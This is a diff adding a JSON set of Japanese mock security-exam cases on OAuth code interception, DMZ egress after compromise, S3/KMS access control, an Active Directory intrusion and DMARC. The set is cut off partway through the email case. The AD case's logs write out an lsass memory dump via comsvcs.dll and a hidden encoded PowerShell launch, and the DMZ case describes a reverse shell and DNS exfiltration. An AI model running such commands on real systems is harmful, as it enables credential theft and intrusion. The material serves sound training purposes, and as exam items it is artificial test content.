@@ -1,0 +1,2046 @@
+{
+  "setId": "sc-b-mock01",
+  "schemaVersion": "1.0",
+  "language": "ja",
+  "exam": "情報処理安全確保支援士試験 科目B（2027年度以降の形式を想定したオリジナル模擬問題）",
+  "part": "1問1答（single）8問＋1問3答（multi）4大問12設問",
+  "generatedAt": "2026-11-22",
+  "cases": [
+    {
+      "caseId": "sc-b-mock01-c01",
+      "caseType": "single",
+      "title": "スマートフォン向け経費アプリにおける認可コードの横取り",
+      "domains": [
+        "認証・認可",
+        "インシデント対応"
+      ],
+      "body": [
+        {
+          "type": "paragraph",
+          "text": "K社は，従業員1,500名の物流会社である。K社では，社内のIDプロバイダ（以下，K-IdPという）によるシングルサインオンを導入している。経費精算サービスのスマートフォン用ネイティブアプリ（以下，経費アプリという）は，OAuth 2.0の認可コードグラントによってK-IdPからアクセストークンを取得し，経費精算サービスのAPI（以下，経費APIという）を呼び出す。経費アプリは，従業員が私物のスマートフォンにインストールして利用している。"
+        },
+        {
+          "type": "paragraph",
+          "text": "経費アプリは，OS標準の外部ブラウザでK-IdPの認可エンドポイントを開く。利用者がK-IdPで認証すると，K-IdPはredirect_uriへのリダイレクトによって認可コードとstateを返す。OSは，redirect_uriのスキーム（keihi://）を処理するアプリとして宣言されているアプリを起動し，認可レスポンスを渡す。経費アプリは，受け取った認可コードをK-IdPのトークンエンドポイントに送信し，アクセストークンとリフレッシュトークンを取得する。"
+        },
+        {
+          "type": "table",
+          "id": "表1",
+          "caption": "経費アプリのK-IdPへの登録内容とK-IdPの設定（抜粋）",
+          "columns": [
+            "項目",
+            "設定値"
+          ],
+          "rows": [
+            [
+              "client_id",
+              "keihi-mobile"
+            ],
+            [
+              "クライアント種別",
+              "パブリッククライアント（クライアントシークレットなし。トークンエンドポイントでクライアント認証を行わない）"
+            ],
+            [
+              "登録済みredirect_uri",
+              "keihi://callback（カスタムURLスキーム）"
+            ],
+            [
+              "redirect_uriの照合方式",
+              "完全一致"
+            ],
+            [
+              "state",
+              "経費アプリが認可リクエストごとに128ビットの乱数を生成し，認可レスポンス受信時に照合する"
+            ],
+            [
+              "PKCE",
+              "未対応（経費アプリはcode_challengeを送信しない。K-IdPもPKCEを必須としていない）"
+            ],
+            [
+              "認可コードの有効期間",
+              "発行から60秒。1回だけ使用可能"
+            ],
+            [
+              "アクセストークンの有効期間",
+              "10分"
+            ],
+            [
+              "リフレッシュトークンの有効期間",
+              "30日（使用時のローテーションなし）"
+            ],
+            [
+              "利用者のパスワード変更時の既存トークン",
+              "失効させない"
+            ],
+            [
+              "トークンの個別失効",
+              "K-IdP管理画面から，リフレッシュトークン単位で失効させることができる。失効させたリフレッシュトークンを用いて発行されたアクセストークンも同時に失効する"
+            ]
+          ]
+        },
+        {
+          "type": "heading",
+          "text": "〔インシデントの発生〕"
+        },
+        {
+          "type": "paragraph",
+          "text": "11月11日，営業部の従業員Xさんから，“昨日，経費アプリにログインしようとしたところ，1回目はK-IdPでの認証後に何も起きず，2回目で成功した”との問合せがあった。同日，経費APIで，Xさんのアカウントによる経費明細の大量ダウンロードが検知された。情報セキュリティ部のYさん（登録セキスペ）は，K-IdPのログを調査した。表2は，Xさんの利用者ID u1024 に関するログの抜粋である。"
+        },
+        {
+          "type": "table",
+          "id": "表2",
+          "caption": "K-IdPのログ（11月10日，利用者ID u1024，抜粋）",
+          "columns": [
+            "No.",
+            "時刻",
+            "エンドポイント",
+            "送信元IPアドレス",
+            "User-Agent",
+            "内容"
+          ],
+          "rows": [
+            [
+              "1",
+              "09:12:03",
+              "認可",
+              "203.0.113.45",
+              "Mobile Safari",
+              "認可リクエスト受付：client_id=keihi-mobile，redirect_uri=keihi://callback，state=8fK2…（以下省略），code_challengeなし"
+            ],
+            [
+              "2",
+              "09:12:18",
+              "認可",
+              "203.0.113.45",
+              "Mobile Safari",
+              "認証成功（パスワード及びTOTP）。認可コードc-71aを発行し，keihi://callbackへリダイレクト"
+            ],
+            [
+              "3",
+              "09:12:19",
+              "トークン",
+              "198.51.100.77",
+              "python-requests/2.31",
+              "grant_type=authorization_code，code=c-71a：成功。アクセストークンAT-1，リフレッシュトークンRT-1を発行"
+            ],
+            [
+              "4",
+              "09:13:02",
+              "認可",
+              "203.0.113.45",
+              "Mobile Safari",
+              "認可リクエスト受付：client_id=keihi-mobile，redirect_uri=keihi://callback，state=Qm3d…（以下省略），code_challengeなし"
+            ],
+            [
+              "5",
+              "09:13:10",
+              "認可",
+              "203.0.113.45",
+              "Mobile Safari",
+              "認証成功（パスワード及びTOTP）。認可コードc-9beを発行し，keihi://callbackへリダイレクト"
+            ],
+            [
+              "6",
+              "09:13:11",
+              "トークン",
+              "203.0.113.45",
+              "KeihiApp/3.2 (iOS)",
+              "grant_type=authorization_code，code=c-9be：成功。アクセストークンAT-2，リフレッシュトークンRT-2を発行"
+            ],
+            [
+              "7",
+              "09:41:55",
+              "トークン",
+              "198.51.100.77",
+              "python-requests/2.31",
+              "grant_type=refresh_token，refresh_token=RT-1：成功。アクセストークンAT-3を発行"
+            ],
+            [
+              "8",
+              "13:20:40",
+              "トークン",
+              "198.51.100.77",
+              "python-requests/2.31",
+              "grant_type=refresh_token，refresh_token=RT-1：成功。アクセストークンAT-4を発行"
+            ]
+          ],
+          "notes": [
+            "注記 K-IdPは，トークンリクエストの送信元IPアドレス及びUser-Agentを記録するが，これらをトークン発行の可否の判断には用いていない。"
+          ]
+        },
+        {
+          "type": "paragraph",
+          "text": "Xさんのスマートフォンを調査したところ，11月9日に業務と無関係のアプリが追加でインストールされており，当該アプリもkeihi://スキームを処理するアプリとして宣言していたことが判明した。"
+        }
+      ]
+    },
+    {
+      "caseId": "sc-b-mock01-c02",
+      "caseType": "single",
+      "title": "DMZのWebサーバ侵害後に攻撃者が開始できる通信",
+      "domains": [
+        "ネットワークセキュリティ",
+        "インシデント対応"
+      ],
+      "body": [
+        {
+          "type": "paragraph",
+          "text": "L社は，家具の通信販売を行う従業員400名の会社である。L社のネットワーク構成を図1に，ファイアウォール（以下，FWという）のフィルタリングルールを表1に，主なサーバの設定を表2に示す。"
+        },
+        {
+          "type": "diagram",
+          "id": "図1",
+          "caption": "L社のネットワーク構成（抜粋）",
+          "diagramType": "network",
+          "nodes": [
+            {
+              "id": "inet",
+              "label": "インターネット",
+              "kind": "cloud"
+            },
+            {
+              "id": "fw",
+              "label": "FW",
+              "kind": "firewall"
+            },
+            {
+              "id": "dmz",
+              "label": "DMZ 192.168.10.0/24",
+              "kind": "segment",
+              "members": [
+                "Webサーバ 192.168.10.10",
+                "キャッシュDNSサーバ 192.168.10.20",
+                "プロキシサーバ 192.168.10.30"
+              ]
+            },
+            {
+              "id": "srv",
+              "label": "サーバセグメント 10.10.0.0/24",
+              "kind": "segment",
+              "members": [
+                "APサーバ 10.10.0.10",
+                "DBサーバ 10.10.0.20",
+                "ADサーバ（社内DNS・NTP）10.10.0.30"
+              ]
+            },
+            {
+              "id": "pc",
+              "label": "社内PCセグメント 10.20.0.0/16",
+              "kind": "segment",
+              "members": [
+                "業務PC",
+                "管理端末 10.20.5.0/24（例：10.20.5.11）"
+              ]
+            }
+          ],
+          "edges": [
+            [
+              "inet",
+              "fw"
+            ],
+            [
+              "fw",
+              "dmz"
+            ],
+            [
+              "fw",
+              "srv"
+            ],
+            [
+              "fw",
+              "pc"
+            ]
+          ],
+          "notes": [
+            "注記1 各セグメント間の通信は全てFWを経由する。同一セグメント内のサーバ間の通信はFWを経由しない。",
+            "注記2 L社の社内のIPアドレスは全て10.0.0.0/8の範囲にある。"
+          ],
+          "fallbackText": "インターネット―FW―{DMZ 192.168.10.0/24（Web .10，キャッシュDNS .20，プロキシ .30）， サーバセグメント 10.10.0.0/24（AP .10，DB .20，AD .30）， 社内PCセグメント 10.20.0.0/16（管理端末 10.20.5.0/24）}"
+        },
+        {
+          "type": "table",
+          "id": "表1",
+          "caption": "FWのフィルタリングルール",
+          "columns": [
+            "No.",
+            "送信元",
+            "宛先",
+            "サービス",
+            "動作",
+            "備考"
+          ],
+          "rows": [
+            [
+              "1",
+              "any",
+              "192.168.10.10",
+              "TCP/443",
+              "許可",
+              "インターネットからWebサーバへ"
+            ],
+            [
+              "2",
+              "192.168.10.10",
+              "10.10.0.10",
+              "TCP/8443",
+              "許可",
+              "WebサーバからAPサーバへ"
+            ],
+            [
+              "3",
+              "10.10.0.30",
+              "192.168.10.20",
+              "UDP/53，TCP/53",
+              "許可",
+              "社内DNSからキャッシュDNSサーバへの転送"
+            ],
+            [
+              "4",
+              "10.20.5.0/24",
+              "192.168.10.0/24",
+              "TCP/22",
+              "許可",
+              "管理端末からDMZの各サーバへ"
+            ],
+            [
+              "5",
+              "10.20.0.0/16",
+              "192.168.10.30",
+              "TCP/8080",
+              "許可",
+              "社内PCからプロキシサーバへ"
+            ],
+            [
+              "6",
+              "192.168.10.0/24",
+              "10.0.0.0/8",
+              "any",
+              "拒否",
+              "DMZから社内への通信の遮断"
+            ],
+            [
+              "7",
+              "192.168.10.30",
+              "any",
+              "TCP/80，TCP/443",
+              "許可",
+              "プロキシサーバからインターネットへ"
+            ],
+            [
+              "8",
+              "192.168.10.20",
+              "any",
+              "UDP/53，TCP/53",
+              "許可",
+              "キャッシュDNSサーバからインターネットへ"
+            ],
+            [
+              "9",
+              "192.168.10.10",
+              "203.0.113.80",
+              "TCP/443",
+              "許可",
+              "Webサーバから決済代行APIへ"
+            ],
+            [
+              "10",
+              "192.168.10.0/24",
+              "10.10.0.30",
+              "UDP/123",
+              "許可",
+              "DMZのサーバから社内NTPへ（2026年10月追加）"
+            ],
+            [
+              "11",
+              "any",
+              "any",
+              "any",
+              "拒否",
+              "上記以外"
+            ]
+          ],
+          "notes": [
+            "注記1 ルールは上から順に評価され，最初に一致したルールが適用される。",
+            "注記2 FWはステートフルインスペクション型であり，許可した通信に対する応答パケットは自動的に許可される。"
+          ]
+        },
+        {
+          "type": "table",
+          "id": "表2",
+          "caption": "主なサーバの設定（抜粋）",
+          "columns": [
+            "サーバ",
+            "設定内容"
+          ],
+          "rows": [
+            [
+              "Webサーバ",
+              "名前解決先（/etc/resolv.conf）：nameserver 192.168.10.20。時刻同期先：10.10.0.30。Webアプリケーションは一般利用者権限のアカウントwebappで動作する"
+            ],
+            [
+              "キャッシュDNSサーバ",
+              "再帰問合せを受け付ける送信元：192.168.10.0/24，10.10.0.30。フォワーダは設定せず，ルートサーバから順に反復問合せを行う。問合せ名による制限はない"
+            ],
+            [
+              "プロキシサーバ",
+              "接続を受け付ける送信元：10.20.0.0/16（それ以外の送信元からの接続はTCPの接続確立後に拒否する）。宛先による制限はない"
+            ],
+            [
+              "APサーバ",
+              "TCP/8443で業務APIを提供する"
+            ],
+            [
+              "DBサーバ",
+              "TCP/5432で待ち受ける"
+            ],
+            [
+              "ADサーバ",
+              "社内向けDNS（外部名はキャッシュDNSサーバへ転送）及びNTP（UDP/123）を提供する"
+            ]
+          ]
+        },
+        {
+          "type": "heading",
+          "text": "〔インシデントの発生〕"
+        },
+        {
+          "type": "paragraph",
+          "text": "ある日，WebサーバのWebアプリケーションにOSコマンドインジェクションの脆弱性があり，攻撃者がwebappの権限で任意のOSコマンドを実行できる状態であったことが判明した。情報システム部のZさん（登録セキスペ）は，影響範囲を見積もるため，攻撃者がWebサーバ上から開始し得る通信を表3のとおり洗い出した。攻撃者は，インターネット上にサーバ198.51.100.9を保有し，ドメインatk.exampleの権威DNSサーバ（198.51.100.53）を運用しているものとする。"
+        },
+        {
+          "type": "table",
+          "id": "表3",
+          "caption": "攻撃者がWebサーバ上から開始し得る通信の候補",
+          "columns": [
+            "記号",
+            "通信の内容"
+          ],
+          "rows": [
+            [
+              "①",
+              "WebサーバからAPサーバ（10.10.0.10）のTCP/8443へHTTPSリクエストを送信し，業務APIを呼び出す"
+            ],
+            [
+              "②",
+              "WebサーバからADサーバ（10.10.0.30）のUDP/123へ，細工したNTPパケットを送信する"
+            ],
+            [
+              "③",
+              "Webサーバから攻撃者のサーバ198.51.100.9のTCP/443へ接続し，リバースシェルを確立する"
+            ],
+            [
+              "④",
+              "Webサーバで，窃取したデータを符号化してラベルに埋め込んだ名前（例：4f2a9c….d.atk.example）の名前解決を行い，問合せを攻撃者の権威DNSサーバに到達させる"
+            ],
+            [
+              "⑤",
+              "Webサーバから管理端末10.20.5.11のTCP/22へ接続する"
+            ],
+            [
+              "⑥",
+              "Webサーバからプロキシサーバ（192.168.10.30）のTCP/8080に接続し，CONNECTメソッドで198.51.100.9:443への中継を要求する"
+            ]
+          ]
+        }
+      ]
+    },
+    {
+      "caseId": "sc-b-mock01-c03",
+      "caseType": "single",
+      "title": "クラウドストレージ上の帳票に対するアクセス制御の評価",
+      "domains": [
+        "クラウドセキュリティ",
+        "アクセス制御"
+      ],
+      "body": [
+        {
+          "type": "paragraph",
+          "text": "N社は，会員制の通販事業を営む従業員800名の会社である。N社は，月次の売上帳票と監査用資料をパブリッククラウドAWSのオブジェクトストレージAmazon S3のバケットn-reports-prod（東京リージョンap-northeast-1）に保存している。バケットは本番用AWSアカウント111122223333にあり，同アカウントはAWS Organizationsの本番OUに所属している。外部の監査法人は，監査法人自身のAWSアカウント444455556666（N社のOrganizationsには所属しない）のIAMロールAuditReaderから監査用資料を参照する。"
+        },
+        {
+          "type": "paragraph",
+          "text": "N社の情報セキュリティ部のWさん（登録セキスペ）は，設定変更のレビューのため，表1〜表3及び図1〜図5を確認した。"
+        },
+        {
+          "type": "table",
+          "id": "表1",
+          "caption": "バケットn-reports-prodの設定（抜粋）",
+          "columns": [
+            "項目",
+            "設定値"
+          ],
+          "rows": [
+            [
+              "既定の暗号化",
+              "2026年4月10日以降：SSE-KMS（カスタマー管理キーK1：key/7f3e9a10-5c2d-4b8e-9a61-0d2c4e8b1f37）。それより前：SSE-S3"
+            ],
+            [
+              "ブロックパブリックアクセス",
+              "全て有効"
+            ],
+            [
+              "バケットポリシー",
+              "図1のとおり"
+            ],
+            [
+              "アクセス経路",
+              "本番VPCにS3用のゲートウェイ型VPCエンドポイントvpce-0a1b2c3d4e5f60718を設置している"
+            ]
+          ]
+        },
+        {
+          "type": "code",
+          "id": "図1",
+          "caption": "バケットポリシー",
+          "language": "json",
+          "content": "{\n  \"Version\": \"2012-10-17\",\n  \"Statement\": [\n    {\n      \"Sid\": \"DenyInsecureTransport\",\n      \"Effect\": \"Deny\",\n      \"Principal\": \"*\",\n      \"Action\": \"s3:*\",\n      \"Resource\": [\"arn:aws:s3:::n-reports-prod\", \"arn:aws:s3:::n-reports-prod/*\"],\n      \"Condition\": {\"Bool\": {\"aws:SecureTransport\": \"false\"}}\n    },\n    {\n      \"Sid\": \"DenyOwnAccountOutsideVpce\",\n      \"Effect\": \"Deny\",\n      \"Principal\": \"*\",\n      \"Action\": [\"s3:GetObject\", \"s3:PutObject\"],\n      \"Resource\": \"arn:aws:s3:::n-reports-prod/*\",\n      \"Condition\": {\n        \"StringNotEquals\": {\"aws:SourceVpce\": \"vpce-0a1b2c3d4e5f60718\"},\n        \"StringEquals\": {\"aws:PrincipalAccount\": \"111122223333\"}\n      }\n    },\n    {\n      \"Sid\": \"AllowAuditorRead\",\n      \"Effect\": \"Allow\",\n      \"Principal\": {\"AWS\": \"arn:aws:iam::444455556666:role/AuditReader\"},\n      \"Action\": \"s3:GetObject\",\n      \"Resource\": \"arn:aws:s3:::n-reports-prod/audit/*\"\n    }\n  ]\n}"
+        },
+        {
+          "type": "code",
+          "id": "図2",
+          "caption": "IAMロールReportBatchRole（アカウント111122223333）に付与したポリシー（これ以外のポリシーは付与していない）",
+          "language": "json",
+          "content": "{\n  \"Version\": \"2012-10-17\",\n  \"Statement\": [\n    {\n      \"Sid\": \"S3Monthly\",\n      \"Effect\": \"Allow\",\n      \"Action\": [\"s3:GetObject\", \"s3:PutObject\"],\n      \"Resource\": \"arn:aws:s3:::n-reports-prod/monthly/*\"\n    },\n    {\n      \"Sid\": \"KmsUse\",\n      \"Effect\": \"Allow\",\n      \"Action\": [\"kms:GenerateDataKey\", \"kms:Decrypt\"],\n      \"Resource\": \"arn:aws:kms:ap-northeast-1:111122223333:key/7f3e9a10-5c2d-4b8e-9a61-0d2c4e8b1f37\"\n    }\n  ]\n}",
+          "notes": [
+            "注記 ReportBatchRoleの信頼ポリシーは，EC2サービス及び運用担当者用のIAMロールOpsRoleからのAssumeRoleを許可している。"
+          ]
+        },
+        {
+          "type": "code",
+          "id": "図3",
+          "caption": "カスタマー管理キーK1のキーポリシー",
+          "language": "json",
+          "content": "{\n  \"Version\": \"2012-10-17\",\n  \"Statement\": [\n    {\n      \"Sid\": \"EnableIAMPolicies\",\n      \"Effect\": \"Allow\",\n      \"Principal\": {\"AWS\": \"arn:aws:iam::111122223333:root\"},\n      \"Action\": \"kms:*\",\n      \"Resource\": \"*\"\n    },\n    {\n      \"Sid\": \"AllowKeyAdministration\",\n      \"Effect\": \"Allow\",\n      \"Principal\": {\"AWS\": \"arn:aws:iam::111122223333:role/KeyAdminRole\"},\n      \"Action\": [\"kms:Create*\", \"kms:Describe*\", \"kms:Enable*\", \"kms:List*\",\n                 \"kms:Put*\", \"kms:Update*\", \"kms:Revoke*\", \"kms:Disable*\",\n                 \"kms:Get*\", \"kms:Delete*\", \"kms:ScheduleKeyDeletion\",\n                 \"kms:CancelKeyDeletion\"],\n      \"Resource\": \"*\"\n    }\n  ]\n}"
+        },
+        {
+          "type": "code",
+          "id": "図4",
+          "caption": "本番OUに適用しているSCP（このほかにAWS管理のFullAWSAccessを適用している）",
+          "language": "json",
+          "content": "{\n  \"Version\": \"2012-10-17\",\n  \"Statement\": [\n    {\n      \"Sid\": \"DenyReportDeletion\",\n      \"Effect\": \"Deny\",\n      \"Action\": [\"s3:DeleteObject\", \"s3:DeleteObjectVersion\"],\n      \"Resource\": \"arn:aws:s3:::n-reports-prod/*\"\n    },\n    {\n      \"Sid\": \"DenyOutsideTokyo\",\n      \"Effect\": \"Deny\",\n      \"NotAction\": [\"iam:*\", \"sts:*\", \"organizations:*\", \"support:*\"],\n      \"Resource\": \"*\",\n      \"Condition\": {\"StringNotEquals\": {\"aws:RequestedRegion\": \"ap-northeast-1\"}}\n    }\n  ]\n}"
+        },
+        {
+          "type": "code",
+          "id": "図5",
+          "caption": "IAMロールAuditReader（アカウント444455556666）に付与したポリシー（監査法人から提供されたもの。これ以外のポリシーは付与していない）",
+          "language": "json",
+          "content": "{\n  \"Version\": \"2012-10-17\",\n  \"Statement\": [\n    {\n      \"Effect\": \"Allow\",\n      \"Action\": \"s3:GetObject\",\n      \"Resource\": \"arn:aws:s3:::n-reports-prod/*\"\n    }\n  ]\n}"
+        },
+        {
+          "type": "table",
+          "id": "表2",
+          "caption": "バケット内の主なオブジェクト",
+          "columns": [
+            "オブジェクトキー",
+            "作成日",
+            "暗号化方式"
+          ],
+          "rows": [
+            [
+              "monthly/2026-03.csv",
+              "2026年4月2日",
+              "SSE-S3"
+            ],
+            [
+              "monthly/2026-09.csv",
+              "2026年10月1日",
+              "SSE-KMS（K1）"
+            ],
+            [
+              "audit/2026Q3.pdf",
+              "2026年10月5日",
+              "SSE-KMS（K1）"
+            ]
+          ]
+        },
+        {
+          "type": "table",
+          "id": "表3",
+          "caption": "評価対象の操作",
+          "columns": [
+            "記号",
+            "操作"
+          ],
+          "rows": [
+            [
+              "①",
+              "本番VPC内のEC2インスタンスでReportBatchRoleを使用するバッチが，VPCエンドポイントvpce-0a1b2c3d4e5f60718を経由しHTTPSで，monthly/2026-10.csvを新規作成するPutObjectを実行する（暗号化方式は指定せず，既定の暗号化を適用する）"
+            ],
+            [
+              "②",
+              "①と同じバッチが，同じ経路で，audit/2026Q3.pdfに対してGetObjectを実行する"
+            ],
+            [
+              "③",
+              "監査法人の担当者が，AuditReaderを使用し，インターネット経由のHTTPSで，audit/2026Q3.pdfに対してGetObjectを実行する"
+            ],
+            [
+              "④",
+              "N社の運用担当者が，OpsRoleからReportBatchRoleにスイッチし，社内PCからインターネット経由のHTTPSで，monthly/2026-09.csvに対してGetObjectを実行する"
+            ],
+            [
+              "⑤",
+              "①と同じバッチが，同じ経路で，monthly/2026-03.csvに対してGetObjectを実行する"
+            ],
+            [
+              "⑥",
+              "①と同じバッチが，VPCエンドポイントを経由し，TLSを使用しないHTTPで，monthly/2026-03.csvに対してGetObjectを実行する"
+            ]
+          ],
+          "notes": [
+            "注記 いずれの操作もap-northeast-1のエンドポイントに対して実行する。KMSのグラントは設定していない。"
+          ]
+        }
+      ]
+    },
+    {
+      "caseId": "sc-b-mock01-c04",
+      "caseType": "single",
+      "title": "Active Directory環境における侵害経路の特定",
+      "domains": [
+        "インシデント対応",
+        "ログ分析",
+        "認証基盤"
+      ],
+      "body": [
+        {
+          "type": "paragraph",
+          "text": "P社は，従業員1,200名の機械部品メーカーである。P社はActive Directory（ドメイン名corp.example.jp）で社内のPCとサーバを管理している。11月11日，EDRがファイルサーバFS01で不審なプロセスを検知した。P社のCSIRTに所属するVさん（登録セキスペ）は，PC，FS01及びドメインコントローラDC01のログを収集して分析した。主なアカウントを表1に，ログの抜粋を表2に，ログの読解に必要な値を表3に示す。"
+        },
+        {
+          "type": "table",
+          "id": "表1",
+          "caption": "主なアカウント",
+          "columns": [
+            "アカウント",
+            "用途",
+            "SPN",
+            "所属グループ・権限",
+            "パスワード等"
+          ],
+          "rows": [
+            [
+              "tanaka",
+              "営業部員（PC-031を使用）",
+              "なし",
+              "Domain Users",
+              "—"
+            ],
+            [
+              "svc_sql$",
+              "SQL01のサービス用グループ管理サービスアカウント（gMSA）",
+              "MSSQLSvc/sql01.corp.example.jp:1433",
+              "SQL01のサービス実行権限だけ",
+              "ADが自動生成（240バイト）し，30日ごとに自動変更する。msDS-SupportedEncryptionTypes：AES128，AES256"
+            ],
+            [
+              "svc_backup",
+              "バックアップソフト用サービスアカウント",
+              "BackupSvc/bk01.corp.example.jp",
+              "Server-Admins（全サーバのローカルAdministratorsグループに登録）",
+              "12文字（英単語＋西暦4桁＋記号1字）。2019年4月以降変更していない。暗号化タイプの指定なし"
+            ],
+            [
+              "adm_sato",
+              "ドメイン管理者（情報システム部）",
+              "なし",
+              "Domain Admins",
+              "16文字。2026年9月に変更"
+            ],
+            [
+              "krbtgt",
+              "Kerberosのチケット発行用",
+              "—",
+              "—",
+              "2018年以降変更していない"
+            ]
+          ],
+          "notes": [
+            "注記 ドメインではRC4によるKerberos暗号化を無効化していない。"
+          ]
+        },
+        {
+          "type": "table",
+          "id": "表2",
+          "caption": "収集したログの抜粋（時刻順）",
+          "columns": [
+            "No.",
+            "日時",
+            "記録元",
+            "イベントID",
+            "内容（抜粋）"
+          ],
+          "rows": [
+            [
+              "1",
+              "11/10 17:20:05",
+              "FS01",
+              "4624",
+              "ログオンの種類：10，アカウント：CORP\\adm_sato，ソースネットワークアドレス：10.20.5.21，ログオンID：0x3E7A12"
+            ],
+            [
+              "2",
+              "11/10 17:48:30",
+              "FS01",
+              "4779",
+              "セッションの切断：アカウント：adm_sato，セッション名：RDP-Tcp#3，クライアントアドレス：10.20.5.21"
+            ],
+            [
+              "3",
+              "11/11 10:02:11",
+              "PC-031",
+              "4688",
+              "新しいプロセス：powershell.exe -nop -w hidden -enc JABzAD0A…（以下省略），親プロセス：WINWORD.EXE，アカウント：CORP\\tanaka"
+            ],
+            [
+              "4",
+              "11/11 10:05:40",
+              "DC01",
+              "4769",
+              "アカウント名：tanaka@CORP.EXAMPLE.JP，サービス名：svc_sql$，チケット暗号化の種類：0x12，クライアントアドレス：::ffff:10.20.3.31"
+            ],
+            [
+              "5",
+              "11/11 10:05:40",
+              "DC01",
+              "4769",
+              "アカウント名：tanaka@CORP.EXAMPLE.JP，サービス名：svc_backup，チケット暗号化の種類：0x17，クライアントアドレス：::ffff:10.20.3.31"
+            ],
+            [
+              "6",
+              "11/11 11:52:30",
+              "FS01",
+              "4624",
+              "ログオンの種類：3，アカウント：CORP\\svc_backup，ソースネットワークアドレス：10.20.3.31，認証パッケージ：NTLM"
+            ],
+            [
+              "7",
+              "11/11 11:52:30",
+              "FS01",
+              "4672",
+              "特殊な特権の割当て：アカウント：svc_backup，特権：SeDebugPrivilege，SeBackupPrivilege ほか"
+            ],
+            [
+              "8",
+              "11/11 11:52:31",
+              "FS01",
+              "7045",
+              "サービスのインストール：サービス名：WinSvcUpd，イメージパス：%SystemRoot%\\wsu.exe，開始の種類：要求時，アカウント：LocalSystem"
+            ],
+            [
+              "9",
+              "11/11 12:41:09",
+              "FS01",
+              "4688",
+              "新しいプロセス：rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump 668 C:\\Windows\\Temp\\d.bin full，親プロセス：wsu.exe，アカウント：NT AUTHORITY\\SYSTEM"
+            ],
+            [
+              "10",
+              "11/11 13:05:12",
+              "DC01",
+              "4624",
+              "ログオンの種類：3，アカウント：CORP\\adm_sato，ソースネットワークアドレス：10.10.0.21，認証パッケージ：NTLM"
+            ],
+            [
+              "11",
+              "11/11 13:05:13",
+              "DC01",
+              "4662",
+              "サブジェクト：CORP\\adm_sato，オブジェクト名：DC=corp,DC=example,DC=jp，アクセス：制御アクセス，プロパティ：{1131f6aa-9c07-11d1-f79f-00c04fc2dcd2} {1131f6ad-9c07-11d1-f79f-00c04fc2dcd2}"
+            ],
+            [
+              "12",
+              "11/11 13:09:40",
+              "DC01",
+              "4720",
+              "ユーザーアカウントの作成：新しいアカウント：svc_monitor，作成者：CORP\\adm_sato"
+            ],
+            [
+              "13",
+              "11/11 13:09:52",
+              "DC01",
+              "4728",
+              "セキュリティが有効なグローバルグループへのメンバー追加：グループ：Domain Admins，メンバー：svc_monitor，実行者：CORP\\adm_sato"
+            ]
+          ],
+          "notes": [
+            "注記1 PC-031のIPアドレスは10.20.3.31，FS01のIPアドレスは10.10.0.21，管理端末のIPアドレスは10.20.5.21である。",
+            "注記2 FS01では，No.1のログオンID 0x3E7A12に対応するログオフ（イベントID 4634，4647）は，ログ収集時点（11/12 09:00）まで記録されていない。",
+            "注記3 FS01上のプロセスID 668は，lsass.exeである。",
+            "注記4 adm_satoがPC-031にログオンした記録は，PC-031のログにもDC01のログにもない。"
+          ]
+        },
+        {
+          "type": "table",
+          "id": "表3",
+          "caption": "ログの読解に必要な値",
+          "columns": [
+            "値",
+            "意味"
+          ],
+          "rows": [
+            [
+              "チケット暗号化の種類 0x12",
+              "AES256-CTS-HMAC-SHA1-96"
+            ],
+            [
+              "チケット暗号化の種類 0x17",
+              "RC4-HMAC（鍵はアカウントのNTハッシュ）"
+            ],
+            [
+              "{1131f6aa-9c07-11d1-f79f-00c04fc2dcd2}",
+              "拡張権限 DS-Replication-Get-Changes（ディレクトリの変更のレプリケート）"
+            ],
+            [
+              "{1131f6ad-9c07-11d1-f79f-00c04fc2dcd2}",
+              "拡張権限 DS-Replication-Get-Changes-All（ディレクトリの変更すべてのレプリケート）"
+            ]
+          ]
+        }
+      ]
+    },
+    {
+      "caseId": "sc-b-mock01-c05",
+      "caseType": "single",
+      "title": "送信ドメイン認証の厳格化による影響評価",
+      "domains": [
+        "電子メールセキュリティ",
+        "ネットワーク・DNS"
+      ],
+      "body": [
+        {
+          "type": "paragraph",
+          "text": "R社は，インターネット専業の証券会社である。R社は，顧客向けメールに自社ドメインr-shoken.exampleを使用している。一部のメールは，配信代行事業者Q社（ドメインmailsvc.example）のサービスから送信している。R社はなりすましメール対策として，10月1日にDMARCポリシーをp=noneからp=rejectに変更し，同時にDKIMの識別子アラインメントをrelaxed（adkim=r）からstrict（adkim=s）に変更した。"
+        },
+        {
+          "type": "paragraph",
+          "text": "変更後，“R社からのメールが届かない”という問合せが顧客から寄せられた。R社のシステム部のUさん（登録セキスペ）は，顧客の受信サーバから提供された受信記録（表1）と，関係するDNSレコード（図1）を基に，どのメールが受信拒否されるかを確認することにした。"
+        },
+        {
+          "type": "code",
+          "id": "図1",
+          "caption": "関係するDNSレコード（抜粋）",
+          "language": "dns",
+          "content": "r-shoken.example.                      IN TXT \"v=spf1 ip4:203.0.113.32/28 include:_spf.mailsvc.example -all\"\nbounce.r-shoken.example.               IN TXT \"v=spf1 include:_spf.mailsvc.example -all\"\nnews.r-shoken.example.                 IN TXT \"v=spf1 ip4:203.0.113.64/28 -all\"\n_dmarc.r-shoken.example.               IN TXT \"v=DMARC1; p=reject; adkim=s; aspf=r; rua=mailto:dmarc-rua@r-shoken.example\"\nselector1._domainkey.r-shoken.example. IN TXT \"v=DKIM1; k=rsa; p=MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8A…（以下省略）\"\nmailsvc.example.                       IN TXT \"v=spf1 include:_spf.mailsvc.example -all\"\n_spf.mailsvc.example.                  IN TXT \"v=spf1 ip4:198.51.100.0/25 -all\"",
+          "notes": [
+            "注記1 bounce.r-shoken.example，news.r-shoken.example及びmailsvc.exampleには，DMARCレコードを設定していない。",
+            "注記2 r-shoken.exampleのサブドメインの組織ドメイン（Organizational Domain）は，r-shoken.exampleである。mailsvc.exampleの組織ドメインはmailsvc.exampleである。"
+          ]
+        },
+        {
+          "type": "table",
+          "id": "表1",
+          "caption": "顧客の受信サーバにおける受信記録（抜粋）",
+          "columns": [
+            "項番",
+            "送信元IPアドレス",
+            "エンベロープFrom（MAIL FROM）",
+            "ヘッダーFrom",
+            "DKIM署名のd=",
+            "DKIM署名の検証結果",
+            "備考"
+          ],
+          "rows": [
+            [
+              "M1",
+              "198.51.100.25",
+              "bounce@mailsvc.example",
+              "info@r-shoken.example",
+              "r-shoken.example",
+              "pass",
+              "Q社経由のお知らせメール"
+            ],
+            [
+              "M2",
+              "198.51.100.40",
+              "nb-0912@bounce.r-shoken.example",
+              "news@r-shoken.example",
+              "mailsvc.example",
+              "pass",
